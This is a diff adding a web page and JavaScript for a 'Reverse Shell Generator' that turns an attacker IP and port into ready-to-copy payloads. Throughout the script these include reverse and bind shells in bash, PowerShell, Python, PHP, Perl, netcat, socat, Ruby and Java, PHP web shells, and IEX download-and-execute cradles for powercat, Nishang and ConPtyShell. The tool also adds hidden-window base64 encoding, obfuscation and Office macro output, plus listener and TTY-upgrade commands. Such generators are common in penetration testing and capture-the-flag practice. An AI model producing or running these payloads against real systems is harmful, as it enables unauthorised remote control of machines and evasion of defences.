@@ -1,0 +1,583 @@
+<!-- styles in /static/style.css -->
+
+<div id="toolkit-wrapper">
+  <div id="toolkit-controls">
+    <h3>Reverse Shell Generator</h3>
+
+    <label>IP Address:</label>
+    <input type="text" id="tk-ip" list="tk-ip-list" placeholder="192.168.1.1" autocomplete="off">
+    <datalist id="tk-ip-list"></datalist>
+
+    <label>Port:</label>
+    <input type="number" id="tk-port" value="4444" min="1" max="65535">
+
+    <label>Shell Type:</label>
+    <select id="tk-shell-type">
+      <option value="all">All Shells</option>
+      <option value="bash">Bash</option>
+      <option value="powershell">PowerShell</option>
+      <option value="python">Python</option>
+      <option value="php">PHP</option>
+      <option value="perl">Perl</option>
+      <option value="nc">Netcat</option>
+      <option value="ruby">Ruby</option>
+      <option value="java">Java</option>
+      <option value="socat-plain">Socat</option>
+      <option value="socat">Socat (Encrypted)</option>
+      <optgroup label="Shellpy (All Variants)">
+        <option value="sp-powercat">PowerCat</option>
+        <option value="sp-nishang">Nishang</option>
+        <option value="sp-conpty">ConPty</option>
+        <option value="sp-bash">Bash Obfuscated</option>
+        <option value="sp-perl">Perl Obfuscated</option>
+      </optgroup>
+    </select>
+
+    <div id="encoding-group">
+      <label>Encoding:</label>
+      <select id="tk-encoding">
+        <option value="none">None</option>
+        <option value="base64">Base64 (PowerShell)</option>
+        <option value="urlencode">URL Encode</option>
+      </select>
+
+      <div class="tk-check">
+        <input type="checkbox" id="tk-url-safe">
+        <label for="tk-url-safe">URL-safe variants</label>
+      </div>
+    </div>
+
+    <button class="tk-btn" onclick="generatePayloads()">Generate Payloads</button>
+  </div>
+
+  <div id="toolkit-body">
+    <div id="toolkit-left">
+      <p style="color:var(--text-muted);">Select shell type and click Generate.</p>
+    </div>
+    <div id="toolkit-right">
+      <div id="toolkit-listener"></div>
+      <div id="toolkit-tty"></div>
+    </div>
+  </div>
+</div>
+
+<script>
+function initToolkit() {
+  // Adapt encoding dropdown to shell type
+  document.getElementById('tk-shell-type').onchange = updateEncodingOptions;
+  updateEncodingOptions();
+
+  fetch('/ips').then(function(r) { return r.json(); }).then(function(ips) {
+    var list = document.getElementById('tk-ip-list');
+    var input = document.getElementById('tk-ip');
+    for (var i = 0; i < ips.length; i++) {
+      var opt = document.createElement('option');
+      opt.value = ips[i];
+      list.appendChild(opt);
+    }
+    // Set first IP as default
+    if (ips.length > 0) input.value = ips[0];
+    renderRightPanel();
+  });
+}
+
+function updateEncodingOptions() {
+  var shell = document.getElementById('tk-shell-type').value;
+  var encGroup = document.getElementById('encoding-group');
+  var encSelect = document.getElementById('tk-encoding');
+
+  // Shellpy modes have encoding built-in — hide encoding controls
+  if (shell.startsWith('sp-')) {
+    encGroup.style.display = 'none';
+    return;
+  }
+
+  encGroup.style.display = '';
+
+  // Rebuild options based on shell type
+  while (encSelect.firstChild) encSelect.removeChild(encSelect.firstChild);
+
+  var opts = [{ value: 'none', text: 'None' }];
+
+  if (shell === 'powershell' || shell === 'all') {
+    opts.push({ value: 'base64', text: 'Base64 (PowerShell)' });
+  }
+  opts.push({ value: 'urlencode', text: 'URL Encode' });
+
+  opts.forEach(function(o) {
+    var opt = document.createElement('option');
+    opt.value = o.value;
+    opt.textContent = o.text;
+    encSelect.appendChild(opt);
+  });
+}
+
+function isValidIP(str) {
+  // IPv4 or hostname
+  return /^(\d{1,3}\.){3}\d{1,3}$/.test(str) || /^[a-zA-Z0-9][a-zA-Z0-9\-\.]+$/.test(str);
+}
+
+function getIP() {
+  var val = document.getElementById('tk-ip').value.trim();
+  if (!val) return '';
+  if (!isValidIP(val)) {
+    document.getElementById('tk-ip').style.borderColor = 'var(--red)';
+    return '';
+  }
+  document.getElementById('tk-ip').style.borderColor = '';
+  return val;
+}
+
+function addPayload(container, title, payload, shellType) {
+  var block = document.createElement('div');
+  block.className = 'payload-block';
+
+  var header = document.createElement('div');
+  header.className = 'payload-header';
+
+  var span = document.createElement('span');
+  span.textContent = title;
+
+  var btns = document.createElement('div');
+  btns.style.cssText = 'display:flex;gap:4px;';
+
+  // Obfuscate button for PS/Bash/Perl
+  var obfAction = null;
+  if (shellType === 'powershell') obfAction = 'obfuscate_ps';
+  else if (shellType === 'bash') obfAction = 'obfuscate_bash';
+  else if (shellType === 'perl') obfAction = 'obfuscate_perl';
+
+  if (obfAction) {
+    var obfBtn = document.createElement('button');
+    obfBtn.className = 'copy-btn';
+    obfBtn.textContent = 'Obfuscate';
+    obfBtn.setAttribute('data-action', obfAction);
+    obfBtn.setAttribute('data-payload', payload);
+    obfBtn.onclick = function() { runShellpy(this.getAttribute('data-action'), this.getAttribute('data-payload'), block); };
+    btns.appendChild(obfBtn);
+  }
+
+  // Base64 button for PS
+  if (shellType === 'powershell') {
+    var b64Btn = document.createElement('button');
+    b64Btn.className = 'copy-btn';
+    b64Btn.textContent = 'Base64';
+    b64Btn.setAttribute('data-payload', payload);
+    b64Btn.onclick = function() { runShellpy('base64_ps', this.getAttribute('data-payload'), block); };
+    btns.appendChild(b64Btn);
+
+    var macBtn = document.createElement('button');
+    macBtn.className = 'copy-btn';
+    macBtn.textContent = 'Macro';
+    macBtn.setAttribute('data-payload', payload);
+    macBtn.onclick = function() { runShellpy('macro', this.getAttribute('data-payload'), block); };
+    btns.appendChild(macBtn);
+  }
+
+  var copyBtn = document.createElement('button');
+  copyBtn.className = 'copy-btn';
+  copyBtn.textContent = 'Copy';
+  copyBtn.setAttribute('data-payload', payload);
+  copyBtn.onclick = function() {
+    navigator.clipboard.writeText(this.getAttribute('data-payload'));
+    this.textContent = 'Copied!';
+    var self = this;
+    setTimeout(function() { self.textContent = 'Copy'; }, 1500);
+  };
+  btns.appendChild(copyBtn);
+
+  header.appendChild(span);
+  header.appendChild(btns);
+
+  var body = document.createElement('div');
+  body.className = 'payload-body';
+  body.textContent = payload;
+
+  block.appendChild(header);
+  block.appendChild(body);
+  container.appendChild(block);
+}
+
+function runShellpy(action, payload, parentBlock) {
+  var ip = getIP();
+  var port = document.getElementById('tk-port').value;
+
+  fetch('/api/shellpy', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ action: action, payload: payload, ip: ip, port: port })
+  })
+  .then(function(r) { return r.json(); })
+  .then(function(data) {
+    if (data.error) { alert('Shellpy error: ' + data.error); return; }
+
+    // Remove previous results from this block
+    var old = parentBlock.querySelectorAll('.shellpy-result');
+    old.forEach(function(el) { el.remove(); });
+
+    // Add results below the payload body
+    data.results.forEach(function(r) {
+      var result = document.createElement('div');
+      result.className = 'shellpy-result';
+
+      var rHeader = document.createElement('div');
+      rHeader.className = 'shellpy-result-header';
+
+      var rName = document.createElement('span');
+      rName.textContent = r.name;
+
+      var rCopy = document.createElement('button');
+      rCopy.className = 'copy-btn';
+      rCopy.textContent = 'Copy';
+      rCopy.setAttribute('data-payload', r.payload);
+      rCopy.onclick = function() {
+        navigator.clipboard.writeText(this.getAttribute('data-payload'));
+        this.textContent = 'Copied!';
+        var self = this;
+        setTimeout(function() { self.textContent = 'Copy'; }, 1200);
+      };
+
+      rHeader.appendChild(rName);
+      rHeader.appendChild(rCopy);
+
+      var rBody = document.createElement('div');
+      rBody.className = 'shellpy-result-body';
+      rBody.textContent = r.payload;
+
+      result.appendChild(rHeader);
+      result.appendChild(rBody);
+      parentBlock.appendChild(result);
+    });
+  });
+}
+
+function addSection(container, title) {
+  var div = document.createElement('div');
+  div.className = 'section-title';
+  div.textContent = title;
+  container.appendChild(div);
+}
+
+function psBase64(payload) {
+  var bytes = [];
+  for (var i = 0; i < payload.length; i++) {
+    var code = payload.charCodeAt(i);
+    bytes.push(code & 0xff);
+    bytes.push((code >> 8) & 0xff);
+  }
+  var binary = '';
+  for (var j = 0; j < bytes.length; j++) {
+    binary += String.fromCharCode(bytes[j]);
+  }
+  return btoa(binary);
+}
+
+function renderRightPanel() {
+  var ip = getIP();
+  var port = document.getElementById('tk-port').value;
+  var p = parseInt(port);
+
+  // Listener
+  var lc = document.getElementById('toolkit-listener');
+  while (lc.firstChild) lc.removeChild(lc.firstChild);
+
+  addSection(lc, 'Netcat Listeners');
+  var ncListeners = [
+    ['nc basic', 'rlwrap -cAr nc -nlvp ' + p],
+    ['nc (raw TTY)', 'stty raw -echo; (stty size; cat) | nc -lvnp ' + p],
+    ['ncat (SSL)', 'ncat --ssl -nlvp ' + p],
+  ];
+  for (var i = 0; i < ncListeners.length; i++) addPayload(lc, ncListeners[i][0], ncListeners[i][1]);
+
+  addSection(lc, 'Socat Listeners');
+  var socatListeners = [
+    ['socat basic', 'socat TCP-LISTEN:' + p + ',reuseaddr,fork STDOUT'],
+    ['socat TTY', 'socat file:`tty`,raw,echo=0 TCP-LISTEN:' + p + ',reuseaddr'],
+    ['socat scripted', 'socat TCP-LISTEN:' + p + ',reuseaddr,fork EXEC:/bin/bash'],
+    ['socat SSL gen cert', "openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 30 -out shell.crt -subj '/CN=" + ip + "'\ncat shell.key shell.crt > shell.pem"],
+    ['socat SSL listener', 'socat OPENSSL-LISTEN:' + p + ',cert=shell.pem,verify=0,reuseaddr,fork STDOUT'],
+    ['socat SSL TTY', 'socat -d -d OPENSSL-LISTEN:' + p + ',cert=shell.pem,verify=0,reuseaddr file:`tty`,raw,echo=0'],
+  ];
+  for (var i = 0; i < socatListeners.length; i++) addPayload(lc, socatListeners[i][0], socatListeners[i][1]);
+
+  addSection(lc, 'Connectivity Check');
+  var connCheck = [
+    ['tcpdump', 'tcpdump -i tun0 icmp -n'],
+    ['tshark', "tshark -i tun0 -f 'tcp dst port " + p + "' -Y 'ip.dst == " + ip + "'"],
+  ];
+  for (var i = 0; i < connCheck.length; i++) addPayload(lc, connCheck[i][0], connCheck[i][1]);
+
+  // TTY
+  var tc = document.getElementById('toolkit-tty');
+  while (tc.firstChild) tc.removeChild(tc.firstChild);
+  addSection(tc, 'TTY Upgrade');
+  var ttys = [
+    ['Python PTY', "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"],
+    ['script PTY', 'script /dev/null -c bash'],
+    ['Full TTY', "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n# Ctrl+Z\nstty raw -echo; fg\nexport TERM=xterm; reset xterm"],
+    ['socat TTY spawn', 'socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:' + ip + ':' + p],
+  ];
+  for (var j = 0; j < ttys.length; j++) addPayload(tc, ttys[j][0], ttys[j][1]);
+
+  addSection(tc, 'Helpers');
+  var helpers = [
+    ['PS b64 encode', "echo '<payload>' | iconv -t utf-16le | base64 -w 0; echo"],
+    ['Serve files', 'python3 -m http.server 80'],
+    ['Upload server', 'python3 -m uploadserver 80'],
+  ];
+  for (var j = 0; j < helpers.length; j++) addPayload(tc, helpers[j][0], helpers[j][1]);
+}
+
+function generatePayloads() {
+  var ip = getIP();
+  var port = document.getElementById('tk-port').value;
+  var shellType = document.getElementById('tk-shell-type').value;
+  var encoding = document.getElementById('tk-encoding').value;
+  var urlSafe = document.getElementById('tk-url-safe').checked;
+
+  if (!ip || !port) { alert('Enter IP and port'); return; }
+
+  // Update right panel with current IP/port
+  renderRightPanel();
+
+  // Render shells on the left
+  var output = document.getElementById('toolkit-left');
+  while (output.firstChild) output.removeChild(output.firstChild);
+
+  // Shellpy mode — auto-generate obfuscated variants
+  if (shellType.startsWith('sp-')) {
+    generateShellpyMode(output, ip, port, shellType);
+    return;
+  }
+
+  var types = shellType === 'all'
+    ? ['bash', 'powershell', 'python', 'php', 'perl', 'nc', 'socat-plain', 'socat', 'ruby', 'java']
+    : [shellType];
+
+  for (var t = 0; t < types.length; t++) {
+    var payloads = getPayloads(types[t], ip, port);
+    if (payloads.length === 0) continue;
+
+    addSection(output, payloads[0].section);
+
+    for (var p = 0; p < payloads.length; p++) {
+      var pay = payloads[p].payload;
+
+      if (encoding === 'base64' && types[t] === 'powershell') {
+        pay = 'powershell -nop -w hidden -enc ' + psBase64(pay);
+      } else if (encoding === 'urlencode') {
+        pay = encodeURIComponent(pay);
+      }
+
+      if (urlSafe && encoding !== 'urlencode') {
+        addPayload(output, payloads[p].name, pay, types[t]);
+        addPayload(output, payloads[p].name + ' (URL-encoded)', encodeURIComponent(pay));
+      } else {
+        addPayload(output, payloads[p].name, pay, types[t]);
+      }
+    }
+  }
+}
+
+function generateShellpyMode(output, ip, port, mode) {
+  var p = parseInt(port);
+
+  var configs = {
+    'sp-powercat': {
+      title: 'PowerCat',
+      type: 'ps',
+      payloads: [
+        { name: 'Download + Execute', payload: "IEX(New-Object System.Net.Webclient).DownloadString('http://" + ip + "/powercat.ps1'); powercat -c " + ip + " -p " + p + " -e powershell" },
+        { name: 'Download Only', payload: "IEX(New-Object System.Net.Webclient).DownloadString('http://" + ip + "/powercat.ps1')" },
+        { name: 'Direct Execution', payload: "powercat -c " + ip + " -p " + p + " -e powershell" },
+      ]
+    },
+    'sp-nishang': {
+      title: 'Nishang',
+      type: 'ps',
+      payloads: [
+        { name: 'Download + Execute', payload: "IEX(New-Object System.Net.Webclient).DownloadString('http://" + ip + "/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress " + ip + " -Port " + p },
+        { name: 'Download Only', payload: "IEX(New-Object System.Net.Webclient).DownloadString('http://" + ip + "/Invoke-PowerShellTcp.ps1')" },
+        { name: 'Direct Execution', payload: "Invoke-PowerShellTcp -Reverse -IPAddress " + ip + " -Port " + p },
+      ]
+    },
+    'sp-conpty': {
+      title: 'ConPtyShell',
+      type: 'ps',
+      payloads: [
+        { name: 'Download + Execute', payload: "IEX(New-Object System.Net.Webclient).DownloadString('http://" + ip + "/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell -RemoteIp " + ip + " -RemotePort " + p + " -Rows 50 -Cols 120" },
+        { name: 'Download Only', payload: "IEX(New-Object System.Net.Webclient).DownloadString('http://" + ip + "/Invoke-ConPtyShell.ps1')" },
+        { name: 'Direct Execution', payload: "Invoke-ConPtyShell -RemoteIp " + ip + " -RemotePort " + p + " -Rows 50 -Cols 120" },
+      ]
+    },
+    'sp-bash': {
+      title: 'Bash Obfuscated',
+      type: 'bash',
+      payloads: [
+        { name: 'Bash -i', payload: "bash -i >& /dev/tcp/" + ip + "/" + p + " 0>&1" },
+        { name: 'Bash -c', payload: "bash -c 'bash -i >& /dev/tcp/" + ip + "/" + p + " 0>&1'" },
+        { name: 'mkfifo', payload: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + ip + " " + p + " >/tmp/f" },
+      ]
+    },
+    'sp-perl': {
+      title: 'Perl Obfuscated',
+      type: 'perl',
+      payloads: [
+        { name: 'Perl socket', payload: "perl -e 'use Socket;$i=\"" + ip + "\";$p=" + p + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" },
+      ]
+    }
+  };
+
+  var cfg = configs[mode];
+  if (!cfg) return;
+
+  addSection(output, cfg.title);
+
+  if (cfg.type === 'ps') {
+    var note = document.createElement('p');
+    note.style.cssText = 'color:var(--text-muted);font-size:11px;margin:0 0 12px 0;';
+    note.textContent = 'Reminder: python3 -m http.server 80 (to serve .ps1 files for IEX download)';
+    output.appendChild(note);
+  }
+
+  cfg.payloads.forEach(function(pay) {
+    // Sub-header per payload variant
+    var sub = document.createElement('div');
+    sub.className = 'section-title';
+    sub.style.fontSize = '12px';
+    sub.style.borderBottomWidth = '1px';
+    sub.textContent = pay.name;
+    output.appendChild(sub);
+
+    // 1. Original
+    addPayload(output, 'Original', pay.payload);
+
+    if (cfg.type === 'ps') {
+      // 2. Base64 (client-side, instant)
+      addPayload(output, 'Base64', 'powershell -nop -w hidden -enc ' + psBase64(pay.payload));
+
+      // 3. Obfuscated + Obfuscated Base64 + Macro (via API)
+      var container = document.createElement('div');
+      container.className = 'shellpy-auto-results';
+      output.appendChild(container);
+
+      fetch('/api/shellpy', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ action: 'obfuscate_ps_macro', payload: pay.payload, ip: ip, port: String(p) })
+      })
+      .then(function(r) { return r.json(); })
+      .then(function(data) {
+        if (data.error) return;
+        data.results.forEach(function(r) {
+          addPayload(container, r.name, r.payload);
+        });
+      });
+    } else {
+      // Bash / Perl obfuscation via API
+      var action = cfg.type === 'bash' ? 'obfuscate_bash' : 'obfuscate_perl';
+      var container = document.createElement('div');
+      container.className = 'shellpy-auto-results';
+      output.appendChild(container);
+
+      fetch('/api/shellpy', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ action: action, payload: pay.payload, ip: ip, port: String(p) })
+      })
+      .then(function(r) { return r.json(); })
+      .then(function(data) {
+        if (data.error) return;
+        data.results.forEach(function(r) {
+          addPayload(container, r.name, r.payload);
+        });
+      });
+    }
+  });
+}
+
+function getPayloads(type, ip, port) {
+  var p = parseInt(port);
+  switch(type) {
+    case 'bash':
+      return [
+        {section: 'Bash', name: 'Bash -i', payload: "bash -i >& /dev/tcp/" + ip + "/" + p + " 0>&1"},
+        {section: 'Bash', name: 'Bash -c', payload: "bash -c 'bash -i >& /dev/tcp/" + ip + "/" + p + " 0>&1'"},
+        {section: 'Bash', name: 'mkfifo', payload: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + ip + " " + p + " >/tmp/f"},
+        {section: 'Bash', name: 'exec redirect', payload: "exec 5<>/dev/tcp/" + ip + "/" + p + ";cat <&5 | while read line; do $line 2>&5 >&5; done"},
+      ];
+    case 'powershell':
+      return [
+        {section: 'PowerShell', name: 'PS TCP Client', payload: "$client = New-Object System.Net.Sockets.TCPClient('" + ip + "'," + p + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"},
+        {section: 'PowerShell', name: 'PS One-Liner (short)', payload: "$sm=(New-Object Net.Sockets.TCPClient('" + ip + "'," + p + ")).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($st+'PS '+(pwd).Path+'> ');$sm.Write($sb,0,$sb.Length)}"},
+        {section: 'PowerShell', name: 'powercat IEX', payload: "IEX(New-Object System.Net.Webclient).DownloadString('http://" + ip + "/powercat.ps1'); powercat -c " + ip + " -p " + p + " -e powershell"},
+        {section: 'PowerShell', name: 'Nishang IEX', payload: "IEX(New-Object System.Net.Webclient).DownloadString('http://" + ip + "/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress " + ip + " -Port " + p},
+        {section: 'PowerShell', name: 'ConPty IEX', payload: "IEX(New-Object System.Net.Webclient).DownloadString('http://" + ip + "/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell -RemoteIp " + ip + " -RemotePort " + p + " -Rows 50 -Cols 120"},
+      ];
+    case 'python':
+      return [
+        {section: 'Python', name: 'Python3 socket', payload: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + ip + "\"," + p + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"},
+        {section: 'Python', name: 'Python3 pty', payload: "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"" + ip + "\"," + p + "));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'"},
+        {section: 'Python', name: 'Python2 socket', payload: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + ip + "\"," + p + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"},
+        {section: 'Python', name: 'Windows Python', payload: "python.exe -c \"import socket,subprocess;s=socket.socket();s.connect(('" + ip + "'," + p + "));[subprocess.Popen(['cmd.exe'],stdin=s,stdout=s,stderr=s)]\""},
+      ];
+    case 'php':
+      return [
+        {section: 'PHP', name: 'PHP fsockopen', payload: "php -r '$sock=fsockopen(\"" + ip + "\"," + p + ");exec(\"/bin/sh <&3 >&3 2>&3\");'"},
+        {section: 'PHP', name: 'PHP webshell', payload: "<?php if(isset($_REQUEST['cmd'])){ echo \"<pre>\"; $cmd = ($_REQUEST['cmd']); system($cmd); echo \"</pre>\"; die; } ?>"},
+        {section: 'PHP', name: 'PHP system one-liner', payload: "<?php echo system($_GET['cmd']); ?>"},
+        {section: 'PHP', name: 'PHP proc_open', payload: "php -r '$sock=fsockopen(\"" + ip + "\"," + p + ");$proc=proc_open(\"/bin/sh\",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'"},
+      ];
+    case 'perl':
+      return [
+        {section: 'Perl', name: 'Perl socket', payload: "perl -e 'use Socket;$i=\"" + ip + "\";$p=" + p + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"},
+        {section: 'Perl', name: 'Perl IO', payload: "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"" + ip + ":" + p + "\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"},
+      ];
+    case 'nc':
+      return [
+        {section: 'Netcat', name: 'nc -e (Linux)', payload: "nc -e /bin/bash " + ip + " " + p},
+        {section: 'Netcat', name: 'nc -e (Windows)', payload: "nc.exe -e cmd " + ip + " " + p},
+        {section: 'Netcat', name: 'nc64 PowerShell', payload: ".\\nc64.exe -e powershell " + ip + " " + p},
+        {section: 'Netcat', name: 'ncat SSL', payload: "ncat --ssl " + ip + " " + p + " -e /bin/bash"},
+        {section: 'Netcat', name: 'Bind shell (Linux)', payload: "nc -nlvp " + p + " -e /bin/bash"},
+        {section: 'Netcat', name: 'Bind shell (Windows)', payload: "nc.exe -nlvp " + p + " -e cmd.exe"},
+      ];
+    case 'socat-plain':
+      return [
+        {section: 'Socat', name: 'Reverse shell', payload: "socat TCP:" + ip + ":" + p + " EXEC:/bin/bash"},
+        {section: 'Socat', name: 'Reverse TTY', payload: "socat TCP:" + ip + ":" + p + " EXEC:'bash -li',pty,stderr,setsid,sigint,sane"},
+        {section: 'Socat', name: 'Listener', payload: "socat -d -d TCP-LISTEN:" + p + ",reuseaddr,fork STDOUT"},
+        {section: 'Socat', name: 'Listener TTY', payload: "socat file:`tty`,raw,echo=0 TCP-LISTEN:" + p + ",reuseaddr"},
+        {section: 'Socat', name: 'Bind shell', payload: "socat TCP-LISTEN:" + p + ",reuseaddr,fork EXEC:/bin/bash"},
+        {section: 'Socat', name: 'Connect bind', payload: "socat - TCP:" + ip + ":" + p},
+        {section: 'Socat', name: 'Windows reverse', payload: "socat TCP:" + ip + ":" + p + " EXEC:'cmd.exe',pipes"},
+        {section: 'Socat', name: 'File transfer (send)', payload: "socat TCP-LISTEN:" + p + ",reuseaddr FILE:file.txt"},
+        {section: 'Socat', name: 'File transfer (receive)', payload: "socat TCP:" + ip + ":" + p + " FILE:file.txt,create"},
+      ];
+    case 'socat':
+      return [
+        {section: 'Socat Encrypted', name: '1. Generate cert (attacker)', payload: "openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 30 -out shell.crt -subj '/CN=" + ip + "'\ncat shell.key shell.crt > shell.pem"},
+        {section: 'Socat Encrypted', name: '2. Listener (attacker)', payload: "socat -d -d OPENSSL-LISTEN:" + p + ",cert=shell.pem,verify=0,reuseaddr,fork STDOUT"},
+        {section: 'Socat Encrypted', name: '2. Listener TTY (attacker)', payload: "socat -d -d OPENSSL-LISTEN:" + p + ",cert=shell.pem,verify=0,reuseaddr file:`tty`,raw,echo=0"},
+        {section: 'Socat Encrypted', name: '3. Connect (victim)', payload: "socat OPENSSL:" + ip + ":" + p + ",verify=0 EXEC:/bin/bash"},
+        {section: 'Socat Encrypted', name: '3. Connect TTY (victim)', payload: "socat OPENSSL:" + ip + ":" + p + ",verify=0 EXEC:'bash -li',pty,stderr,setsid,sigint,sane"},
+        {section: 'Socat Encrypted', name: 'Bind shell (victim)', payload: "socat OPENSSL-LISTEN:" + p + ",cert=shell.pem,verify=0,reuseaddr,fork EXEC:/bin/bash"},
+        {section: 'Socat Encrypted', name: 'Connect bind (attacker)', payload: "socat - OPENSSL:" + ip + ":" + p + ",verify=0"},
+        {section: 'Socat Encrypted', name: 'File transfer (send)', payload: "socat OPENSSL-LISTEN:" + p + ",cert=shell.pem,verify=0,reuseaddr FILE:file.txt"},
+        {section: 'Socat Encrypted', name: 'File transfer (receive)', payload: "socat OPENSSL:" + ip + ":" + p + ",verify=0 FILE:file.txt,create"},
+      ];
+    case 'ruby':
+      return [
+        {section: 'Ruby', name: 'Ruby socket', payload: "ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"" + ip + "\"," + p + ");loop{c.gets.chomp!;(IO.popen(\"#{$_}\",\"r\"){|io|c.print io.read})rescue(c.puts \"failed: #{$_}\")}'"},
+        {section: 'Ruby', name: 'Ruby exec', payload: "ruby -rsocket -e'f=TCPSocket.open(\"" + ip + "\"," + p + ").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"},
+      ];
+    case 'java':
+      return [
+        {section: 'Java', name: 'Java Runtime', payload: "Runtime r = Runtime.getRuntime(); Process p = r.exec(\"/bin/bash -c 'bash -i >& /dev/tcp/" + ip + "/" + p + " 0>&1'\"); p.waitFor();"},
+        {section: 'Java', name: 'Groovy reverse', payload: "String host=\"" + ip + "\";int port=" + p + ";String cmd=\"/bin/bash\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();"},
+      ];
+    default:
+      return [];
+  }
+}
+</script>
